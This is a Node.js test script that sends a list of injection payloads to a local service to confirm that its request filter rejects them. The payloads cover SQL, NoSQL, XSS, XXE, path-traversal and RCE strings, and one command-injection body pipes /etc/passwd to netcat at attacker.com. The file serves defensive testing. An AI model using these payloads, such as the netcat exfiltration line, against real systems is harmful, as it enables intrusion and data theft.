#!/usr/bin/env node

const http = require('http');

// Safe logging wrapper - prevents log injection
const safeLog = (message) => {
  if (typeof message !== 'string' || message.length > 100000) return;
  console.log(message);
};

const tests = [
  {
    name: 'Query Parameter - SQL Injection',
    method: 'GET',
    path: '/search?q=admin%27%20UNION%20SELECT%201--',
    headers: {},
    body: null,
    expectedStatus: 400,
    expectedError: 'SQL Injection'
  },
  {
    name: 'Query Parameter - RCE Pattern',
    method: 'GET',
    path: '/search?data=require%28%27fs%27%29',
    headers: {},
    body: null,
    expectedStatus: 400,
    expectedError: 'RCE'
  },
  {
    name: 'Query Parameter - XSS',
    method: 'GET',
    path: '/search?input=%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
    headers: {},
    body: null,
    expectedStatus: 400,
    expectedError: 'XSS'
  },
  {
    name: 'Query Parameter - Path Traversal',
    method: 'GET',
    path: '/search?file=..%2F..%2Fetc%2Fpasswd',
    headers: {},
    body: null,
    expectedStatus: 400,
    expectedError: 'Path Traversal'
  },
  {
    name: 'Query Parameter - Command Injection',
    method: 'GET',
    path: '/search?shell=ls%7Cgrep%20root',
    headers: {},
    body: null,
    expectedStatus: 400,
    expectedError: 'Command Injection'
  },
  {
    name: 'POST Body - SQL Injection',
    method: 'POST',
    path: '/search',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ search: 'admin\' OR \'1\'=\'1' }),
    expectedStatus: 400,
    expectedError: 'SQL Injection'
  },
  {
    name: 'POST Body - NoSQL Injection',
    method: 'POST',
    path: '/search',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: { $ne: null } }),
    expectedStatus: 400,
    expectedError: 'NoSQL Injection'
  },
  {
    name: 'POST Body - XXE Attack',
    method: 'POST',
    path: '/search',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ xml: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' }),
    expectedStatus: 400,
    expectedError: 'XXE'
  },
  {
    name: 'Header - XSS in User-Agent',
    method: 'GET',
    path: '/search?q=test',
    headers: { 'User-Agent': '<img src="x" onerror="alert(1)">' },
    body: null,
    expectedStatus: 400,
    expectedError: 'XSS'
  },
  {
    name: 'Header - SQL Injection in Referer',
    method: 'GET',
    path: '/search',
    headers: { 'Referer': 'http://example.com/?id=1;DROP TABLE users--' },
    body: null,
    expectedStatus: 400,
    expectedError: 'SQL Injection'
  },
  {
    name: 'Header - RCE in Authorization',
    method: 'GET',
    path: '/search',
    headers: { 'Authorization': 'Bearer eval(test)' },
    body: null,
    expectedStatus: 400,
    expectedError: 'RCE'
  },
  {
    name: 'Form-Encoded Body - Command Injection',
    method: 'POST',
    path: '/search',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'cmd=cat%20/etc/passwd%20%7C%20nc%20attacker.com%204444',
    expectedStatus: 400,
    expectedError: 'Command Injection'
  },
  {
    name: 'Clean Request - Should Pass',
    method: 'GET',
    path: '/search?q=admin',
    headers: { 'User-Agent': 'Mozilla/5.0' },
    body: null,
    expectedStatus: 200,
    expectedError: null
  }
];

function runTest(test, index) {
  return new Promise((resolve) => {
    const options = {
      hostname: 'localhost',
      port: 3001,
      path: test.path,
      method: test.method,
      headers: test.headers
    };

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        const passed = res.statusCode === test.expectedStatus;
        const hasExpectedError = !test.expectedError || data.toLowerCase().includes(test.expectedError.toLowerCase());
        const success = passed && hasExpectedError;

        console.log(`${success ? '✓' : '✗'} [${index + 1}/${tests.length}] ${test.name}`);
        if (!success) {
          console.log(`  Expected status: ${test.expectedStatus}, Got: ${res.statusCode}`);
          if (test.expectedError && !hasExpectedError) {
            console.log(`  Expected error containing: "${test.expectedError}", Got: "${data.substring(0, 100)}"`);
          }
        }
        resolve(success);
      });
    });

    req.on('error', (err) => {
      const sanitizedError = (err.message || '').replace(/[\r\n]/g, ' ').substring(0, 500);
      // Use safe logging wrapper to prevent log injection
      safeLog(`✗ [${index + 1}/${tests.length}] ${test.name} - Connection error: ${sanitizedError}`);
      resolve(false);
    });

    // Handle setTimeout timeout
    setTimeout(() => {
      if (!req.writableEnded) {
        req.destroy();
      }
    }, 5000);

    if (test.body) {
      req.write(test.body);
    }
    req.end();
  });
}

async function runAllTests() {
  console.log('\n🛡️  Enhanced Request Body Scanning Tests\n');
  console.log('=' .repeat(60));

  const results = [];
  for (let i = 0; i < tests.length; i++) {
    results.push(await runTest(tests[i], i));
    await new Promise(r => setTimeout(r, 100));
  }

  console.log('=' .repeat(60));
  const passed = results.filter(Boolean).length;
  const total = results.length;
  console.log(`\nResults: ${passed}/${total} tests passed\n`);

  process.exit(passed === total ? 0 : 1);
}

runAllTests();
